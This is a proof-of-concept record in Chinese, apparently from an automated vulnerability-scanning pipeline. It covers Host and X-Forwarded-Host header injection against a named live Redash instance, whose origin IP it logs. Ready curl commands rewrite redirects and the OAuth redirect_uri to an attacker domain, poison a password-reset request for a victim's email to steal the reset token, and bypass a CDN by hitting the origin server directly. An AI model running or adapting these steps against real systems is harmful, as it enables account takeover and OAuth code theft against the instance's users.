# Redash（自建实例）Host 头注入：X-Forwarded-Host/Host 被完全信任 → 根路径 302 与 OAuth redirect_uri 改写、密码重置链接劫持

- **code**: redash-host-header-injection-oauth-redirect-uri-password-res
- **kind**: poc
- **category**: auth-bypass
- **component**: Redash（Flask/Werkzeug + nginx 前置）
- **versions**: 目标实例 nginx/1.9.10（Redash 版本未取到）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 15:16-15:33 UTC，本机 Git Bash + curl（UA=<ARTEX_UA>），目标 https://redash.fanatical.com（源站 107.21.85.212）。① GET / 带 X-Forwarded-Host: evil.example.com → HTTP 302 Location: https://evil.example.com/login?next=https%3A%2F%2Fevil.example.com%2F（根跳转被改写）；② GET /oauth/google?next=/ 带同一头 → 302 到 accounts.google.com，授权 URL 里 redirect_uri=https%3A%2F%2Fevil.example.com%2Foauth%2Fgoogle_callback（OAuth 回调被改写）；③ 直接用 Host: evil.example.com --resolve redash.fanatical.com:443:107.21.85.212 得到与 ① 相同的 Location，说明 nginx 未剥离 Host 且 Flask 信任代理头；④ POST /forgot（带 XFH）返回通用提示页，重置链接由同一 url_for(_external) 机制按 Host 生成（机制推断，邮件原文不可见）。未认证即可触发。
- **path**: pocs/redash-host-header-injection-oauth-redirect-uri-password-res/poc.md
- **tags**: redash, host-header-injection, x-forwarded-host, oauth, redirect_uri, password-reset, account-takeover, open-redirect, cache-poisoning, flask, werkzeug, nginx
- **created_at**: 2026-11-11T15:45:19.650Z
- **engine**: redash.fanatical.com (107.21.85.212)
- **found_by**: vuln-scan

## 描述

Redash（Flask/Werkzeug）依赖请求头生成站外绝对 URL；当前置 nginx 不剥离也不覆盖 Host / X-Forwarded-Host，且应用 trust proxy 头时，任何未认证请求都能把这些头注入到所有 _external URL 里。可直接改写根路径 302 跳转目标、OAuth 授权请求的 redirect_uri、站内外部链接，并（机制上）把密码重置邮件里的链接指向攻击者域——受害者点开即泄露 reset token → 账号接管；也可用于缓存投毒。前提：nginx 透传外部 forwarding 头 + 应用信任它们（本实例实测成立）。

## 用法

```
【前置条件】目标为自建 Redash（页面/响应头可辨识 Werkzeug/Flask；有 /oauth/<provider> 与 /forgot 入口）。攻击面成立需要两点同时满足：① 前置 nginx 不剥离/不覆盖外部 Host 与 X-Forwarded-Host；② 应用 trust proxy 头（实测本实例两者皆成立）。未认证即可触发。

【1) 根路径跳转改写（X-Forwarded-Host）】
curl -sk -D - -o /dev/null -H 'X-Forwarded-Host: evil.example.com' https://<target>/
判据：HTTP 302，Location: https://evil.example.com/login?next=https%3A%2F%2Fevil.example.com%2F

【2) OAuth redirect_uri 改写】
curl -sk -D - -o /dev/null -H 'X-Forwarded-Host: evil.example.com' 'https://<target>/oauth/google?next=/'
判据：302 到 accounts.google.com，授权 URL 中 redirect_uri=https%3A%2F%2Fevil.example.com%2Foauth%2Fgoogle_callback

【3) 直接用 Host 头（不依赖 XFH，验证 nginx 是否透传任意 Host）】
curl -sk -D - -o /dev/null -H 'Host: evil.example.com' --resolve <target>:443:<origin-ip> https://<target>/
判据：Location 与步骤 1 相同 → nginx 接受任意 Host 并透传给 Redash。

【4) 密码重置链接劫持（同一 URL 生成机制）】
先 GET /forgot 取 csrf_token，再：
curl -sk -D - -H 'X-Forwarded-Host: evil.example.com' -H 'X-Forwarded-Proto: http' \
  -d 'csrf_token=<tok>&email=<victim@example.com>' https://<target>/forgot
判据：返回通用提示（"…you will find an email from us in your inbox shortly."）。重置邮件里的链接由 url_for(_external=True) 按 Host 生成，故指向注入域；受害者在攻击者域点开链接即把 reset token 交给攻击者 → 账号接管。邮件原文不可见，此步为机制推断。

【失败/无效的常见原因】
- 前置有 CDN/WAF（CloudFront 等）会重写或拒绝伪造 Host → 需直连源站 IP 绕过边缘。
- nginx 配置了 proxy_set_header Host $host / 覆盖 X-Forwarded-Host → 注入不生效。
- 应用未设 trust proxy 头（Werkzeug 未启用 ProxyFix）→ XFH 被忽略。
- 别把通用提示页当成"已发送重置邮件"的证据：需受害者侧收信才能闭环。
```

## 正文

```
# Redash Host 头注入 → OAuth redirect_uri / 密码重置链接劫持

## 概述
Redash 基于 Flask/Werkzeug，生成站外绝对 URL（`url_for(_external=True)`、登录跳转、OAuth 回调）时直接采信请求里的 Host / X-Forwarded-Host。当前置 nginx 不剥离也不覆盖这些头、且应用启用 trust proxy 时，**未认证**请求即可：
- 改写根路径 302 跳转目标（开放重定向 / 钓鱼）；
- 改写 OAuth 授权请求的 `redirect_uri`（把授权码引到攻击者域）；
- 改写站内外部链接（缓存投毒面）；
- 把密码重置邮件里的链接指向攻击者域（reset token 泄露 → 账号接管）。

## 前置条件
- 自建 Redash 实例，存在 `/oauth/<provider>`、`/forgot` 入口。
- 前置 nginx 不剥离/不覆盖 Host、X-Forwarded-Host（实测本实例成立）。
- 应用信任代理头（ProxyFix / trust proxy，本实例成立）。
- 无需认证。

## 复现

### 1) 根路径跳转改写
```bash
curl -sk -D - -o /dev/null \
  -H 'X-Forwarded-Host: evil.example.com' \
  https://<target>/
# 期望：HTTP/1.1 302 Found
#       Location: https://evil.example.com/login?next=https%3A%2F%2Fevil.example.com%2F
```

### 2) OAuth redirect_uri 改写
```bash
curl -sk -D - -o /dev/null \
  -H 'X-Forwarded-Host: evil.example.com' \
  'https://<target>/oauth/google?next=/'
# 期望：302 → https://accounts.google.com/o/oauth2/v2/auth?...&redirect_uri=https%3A%2F%2Fevil.example.com%2Foauth%2Fgoogle_callback&scope=openid+email+profile&state=...&nonce=...
```

### 3) 直接用 Host 头（不依赖 XFH）
```bash
curl -sk -D - -o /dev/null \
  -H 'Host: evil.example.com' \
  --resolve <target>:443:<origin-ip> \
  https://<target>/
# 期望：Location 与步骤 1 相同 → nginx 未剥离 Host，直接透传给 Redash
```

### 4) 密码重置链接劫持（同一 URL 生成机制）
```bash
# 先取 csrf_token
curl -sk -c jar https://<target>/forgot | grep -o 'csrf_token[^>]*value="[^"]*"'
# 触发重置
curl -sk -D - -b jar \
  -H 'X-Forwarded-Host: evil.example.com' -H 'X-Forwarded-Proto: http' \
  -d 'csrf_token=<tok>&email=<victim@example.com>' \
  https://<target>/forgot
# 期望：200 + "If we found an account associated with that email address, you will find an email from us in your inbox shortly."
# 重置邮件里的链接按 Host 生成 → 指向 evil.example.com，受害者点击即把 reset token 交给攻击者。
```

## 判据
- 302 的 `Location` 主机名跟随注入值 = Host 头注入成立。
- OAuth 授权 URL 中 `redirect_uri` 主机名为注入值 = URL 生成完全信任 Host。
- 步骤 3 返回与步骤 1 相同 → 连 `Host` 本身都未做白名单校验。
- 密码重置闭环需受害者收信并点击，属机制推断（邮件原文不可见）。

## 影响 / 升级面
- 密码重置链接投毒 → reset token 泄露 → 管理员账号接管。
- OAuth 授权码劫持（redirect_uri 指向攻击者域）。
- Web 缓存投毒（若前置有缓存层且未把 Host/XFH 纳入缓存键）。

## 失败 / 无效的常见原因
- 前置 CDN/WAF（如 CloudFront）会重写或拒绝伪造 Host → 需直连源站 IP 绕过边缘。
- nginx 用 `proxy_set_header Host $host` 覆盖，或显式剥离 X-Forwarded-Host。
- 应用未启用 trust proxy（Werkzeug 未做 ProxyFix）→ XFH 被忽略。
- 把通用提示页误判为"已发重置邮件"——需受害者侧收信才算闭环。

```
